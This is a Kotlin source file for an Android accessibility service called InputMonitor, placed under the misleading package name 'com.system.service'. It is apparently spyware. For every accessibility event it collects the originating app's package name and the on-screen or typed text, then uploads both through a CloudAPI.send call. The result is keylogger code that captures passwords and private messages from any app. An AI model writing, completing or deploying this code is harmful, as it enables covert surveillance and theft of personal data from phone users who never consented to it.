package com.system.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class InputMonitor : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: ""
            val text = event.text.joinToString(" ")

            if (text.isNotEmpty()) {
                CloudAPI.send("⌨️ [$pkg] $text")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onInterrupt() {}
}